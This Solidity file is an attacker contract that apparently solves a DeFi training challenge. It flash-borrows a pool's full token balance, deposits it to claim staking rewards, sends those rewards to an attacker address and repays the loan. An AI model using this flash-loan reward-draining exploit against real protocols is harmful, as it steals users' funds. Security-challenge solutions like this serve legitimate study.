// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITheRewarderPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IERC20 {
    function balanceOf(address) external returns (uint256);
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}

contract Attacker5 {
    ITheRewarderPool public immutable rewardPool;
    IFlashLoanerPool public immutable flashLoanerPool;
    IERC20 public immutable liquidityToken;
    IERC20 public immutable rewardToken;
    address public immutable attacker;

    constructor(
        address _rewardPool,
        address _flashLoanerPool,
        address _liquidityToken,
        address _rewardToken,
        address _attacker
    ) {
        rewardPool = ITheRewarderPool(_rewardPool);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        attacker = _attacker;
    }

    function attack() external {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewards);
        rewardPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
